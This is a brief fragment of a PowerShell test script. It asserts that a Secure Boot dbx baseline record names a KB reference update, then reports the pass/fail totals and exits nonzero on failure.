Assert-True 'dbx baseline names the reference update' ("$($sig.dbx_current_baseline.ReferenceKb)" -match '^KB\d+$')

Write-Host "`n  $pass passed, $fail failed" -ForegroundColor $(if($fail){'Red'}else{'Green'})
if ($fail) { exit 1 }
